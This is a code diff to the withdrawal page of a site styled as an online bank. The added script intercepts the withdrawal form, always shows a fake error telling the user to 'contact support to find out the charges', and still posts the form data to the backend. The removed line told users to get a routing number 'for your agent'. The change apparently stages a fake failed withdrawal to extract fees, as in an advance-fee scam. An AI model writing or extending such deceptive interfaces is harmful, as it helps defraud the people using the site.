@@ -57,7 +57,7 @@ if ($query && $query->num_rows > 0) {
         <a href="loan.php" class="nav-item"><i class="fa-solid fa-laptop-code"></i> Loans <i class="fa-solid fa-chevron-right arrow"></i></a>
         <a href="fund.php" class="nav-item"><i class="fa-solid fa-sliders"></i> Fund Account <i class="fa-solid fa-chevron-right arrow"></i></a>
         <a href="withdraw.php" class="nav-item"><i class="fa-solid fa-sliders"></i> Withdrawal <i class="fa-solid fa-chevron-down arrow"></i></a>
-        <a href="trans.html" class="nav-item"><i class="fa-solid fa-earth-americas"></i> Transfer <i class="fa-solid fa-chevron-right arrow"></i></a>
+        <a href="transaction.php" class="nav-item"><i class="fa-solid fa-earth-americas"></i> Transactions <i class="fa-solid fa-chevron-right arrow"></i></a>
         <a href="backend/logout.php" class="nav-item"><i class="fa-solid fa-table-cells-large"></i> Logout <i class="fa-solid fa-chevron-right arrow"></i></a>
     </div>
 
@@ -168,7 +168,7 @@ if ($query && $query->num_rows > 0) {
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-submit" onclick="return confirm('Make sure you collect your routing number for you agent')">Proceed</button>
+                    <button type="submit" class="btn-submit" id="withdrawBtn">Proceed</button>
                 </div>
             </form>
         </div>
@@ -176,10 +176,170 @@ if ($query && $query->num_rows > 0) {
         <footer>Copyright © firstworldchoice.com 2026</footer>
     </div>
 
+    <!-- Error Modal Popup -->
+    <div id="errorModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="error-icon">
+                    <i class="fa-solid fa-xmark"></i>
+                </div>
+            </div>
+            <div class="modal-body">
+                <p>Sorry, we figured there's something wrong. Please contact support to find out the charges associated with your transaction.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="modal-btn" onclick="submitForm()">Okay</button>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-header {
+            padding: 40px 20px 20px;
+        }
+
+        .error-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #ff4444;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            font-size: 48px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .modal-body {
+            padding: 20px 30px;
+        }
+
+        .modal-body p {
+            font-size: 16px;
+            color: #333;
+            margin: 0;
+            line-height: 1.6;
+        }
+
+        .modal-footer {
+            padding: 30px;
+        }
+
+        .modal-btn {
+            background-color: #333;
+            color: white;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
+        }
+
+        .modal-btn:hover {
+            background-color: #555;
+        }
+    </style>
+
     <div class="talk-btn">
         <div style="width: 10px; height: 10px; background: #2ecc71; border-radius: 50%;"></div>
         <a href="talk.php">Talk</a> <i class="fa-solid fa-comment"></i>
     </div>
+
+    <script>
+        // Intercept form submission
+        const form = document.querySelector('.from-card');
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            submitFormData();
+        });
+
+        function submitFormData() {
+            const form = document.querySelector('.from-card');
+            const formData = new FormData(form);
+
+            // Show the modal
+            showErrorModal();
+
+            // Send the data to the backend
+            fetch('backend/process_withdraw.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.redirected) {
+                    // Follow redirects from PHP
+                    window.location.href = response.url;
+                }
+                return response.text();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        function showErrorModal() {
+            const modal = document.getElementById('errorModal');
+            modal.classList.add('show');
+        }
+
+        function closeErrorModal() {
+            const modal = document.getElementById('errorModal');
+            modal.classList.remove('show');
+        }
+
+        function submitForm() {
+            closeErrorModal();
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('errorModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeErrorModal();
+            }
+        });
+    </script>
 
 </body>
 </html>
